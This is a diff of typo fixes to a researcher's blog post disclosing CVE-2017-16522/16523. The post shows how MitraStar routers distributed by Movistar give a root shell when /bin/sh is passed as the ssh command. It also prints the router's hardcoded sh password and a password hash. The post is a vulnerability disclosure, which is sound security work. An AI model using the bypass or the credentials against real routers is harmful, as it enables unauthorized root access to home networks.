@@ -3,7 +3,7 @@ layout: post
 title: MitraStar routers Remote Privilege Escalation
 ---
 
-In this post I will describe how I discovered the vulnerabilities [CVE-2017-16522](https://nvd.nist.gov/vuln/detail/CVE-2017-16522) and [CVE-2017-16523](https://nvd.nist.gov/vuln/detail/CVE-2017-16523). These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with with version up to november 2017.
+In this post I will describe how I discovered the vulnerabilities [CVE-2017-16522](https://nvd.nist.gov/vuln/detail/CVE-2017-16522) and [CVE-2017-16523](https://nvd.nist.gov/vuln/detail/CVE-2017-16523). These two vulnerabilities affect some domestic routers distributed by Movistar (Telefónica). Actually, these vulnerabilities affect all the MitraStar routers with version up to november 2017.
 
 The devices where the research has been made are the MitraStar DSL-100HN-T1 ("*the old*") and the MitraStar GPT-2541GNAC (HGU) ("*the new*").
 
@@ -17,11 +17,11 @@ The devices where the research has been made are the MitraStar DSL-100HN-T1 ("*t
       <img src="/images/router-attack/new.jpeg">
 </p>
 
-These two vulnerabilities can be considered as only one that elevate privileges remotely on the router avoiding the preseted shell.
+These two vulnerabilities can be considered as only one that elevates privileges remotely on the router avoiding the preseted shell.
 
 #### Getting access to the router
 
-THe first thing that I did was a port scanning with the tool *nmap* in the old:
+The first thing I did was a port scanning with the tool *nmap* in the old:
 ```bash
 nmap -F <router_ip>
 ```
@@ -43,7 +43,7 @@ I also discovered months later with reverse engineering that in some routers exi
 
 In my case, with the *admin* user I could get access to the router.
 
-When yoy log in to the router throungh *ssh* the router provides you a limitate shell with some commands that allow you to modify some parameters such as the DHCP, lan parameters, and install updates and configurations. All this functions can be executed through the router's configuration website at 192.168.1.1.
+When you log in to the router through *ssh* the router provides you a limitated shell with some commands that allow you to modify some parameters such as the DHCP, lan parameters, and install updates and configurations. All these functions can be executed through the router configuration website at 192.168.1.1.
 
 ```bash
 $ ssh 1234@192.168.1.3
@@ -68,14 +68,14 @@ V1.13(WJY.0)b15
 
 #### Looking for some bugs
 
-The first thing that I tried was to introduce a long string to produce a buffer overflow or some crashes:
+The first thing I tried was introducing a long string to produce a buffer overflow or some crashes:
 ```bash
  >aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 Cant find command: [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa]. Type '?' for usage
  >
 ```
 
-With the impossibility of find a buffer overflow I introduced accidentally the *sh* command:
+With the impossibility of finding a buffer overflow I accidentally introduced the *sh* command:
 ```bash
  >sh
 Password:Password incorrect !
@@ -86,7 +86,7 @@ This output means that there is a *sh* command that requires a password and it s
 
 #### Using other versions
 
-Afer days without any result I decided to use the other router (*the new*). This router has a differente software version with the same pseudo-shell but with more commands such as *cat* (used to check if a specific file exists) or the *ps* command:
+After days without any result I decided to use the other router (*the new*). This router has a differente software version with the same pseudo-shell but with more commands such as *cat* (used to check if a specific file exists) or the *ps* command:
 ```bash
  > cat /etc/passwd
 1234:Mt3cwxDUQQ7AY:0:0:Administrator:/:/bin/sh
@@ -201,7 +201,7 @@ Afer days without any result I decided to use the other router (*the new*). This
 32030 1234      1696 S    sh -c /bin32031 1234      1696 S    /bin32079 1234      9256 R    ./sshd -m 0
 ```
 
-After explore some commands I found the *deviceinfo* command that offers the following possibilities:
+After I explored some commands I found the *deviceinfo* command which offers the following possibilities:
 ```bash
  > deviceinfo
 Usage: deviceinfo show serialnumber
@@ -230,7 +230,7 @@ data         lib          proc         usr          webs
 I was generating the file system tree and looking for some files with information about the *sh* command password but I didn't find anything.
 
 #### The vulnerability
-The next day I came back to *the old* to try new things but surprisingly I decided to try something unusual. Instead of connect with the router with the command *ssh admin@<router_ip>*, I decided to add the path to the *sh* binary (/bin/sh) as second parameter because by default *ssh* execute the command passed as argument.
+The next day I came back to *the old* to try new things but surprisingly I decided to try something unusual. Instead of connecting to the router with the command *ssh admin@<router_ip>*, I decided to add the path to the *sh* binary (/bin/sh) as second parameter because by default *ssh* execute the command passed as argument.
 ```bash
 ssh 1234@192.168.1.2 <comand>
 ```
@@ -245,21 +245,21 @@ $ ssh 1234@192.168.1.3 /bin/sh
 ```
 
 This looked like there was something wrong and I was waiting for connection but I tried to introduce the *ls* command and surprisingly was executed succesfully!
-I had access to an privilege shell with a complete root access to the system.
+I had access to a privilege shell with a complete root access to the system.
 
 #### Some reverse engineering
 
 I found that the default shell for ssh was a binary call cmdsh in the /bin/ folder.
 
-I was still needing the *sh* command password so I decided to bring the binary to my laptop an execute IDA Pro.
+I still needed the *sh* command password so I decided to bring the binary to my laptop an execute IDA Pro.
 The binary was compiled for MIPS architecture and I only needed to find where the string "Password incorrect!" is used to see a condition before, that compare a string with the string "c93vu02jp4z04", the *sh* password.
 
 <p align="center">
       <img src="/images/router-attack/ida.png">
 </p>
 
-#### Conclutions
+#### Conclusions
 
-I hope you had enjoy reading as much I do writing this post and over all learning something new.
+I hope you have enjoy reading this post as much I did writing it and over all learning something new.
 If you want more post like this one make it me know thorugh Twitter or buying me a [Ko-Fi](https://ko-fi.com/jolama)
 
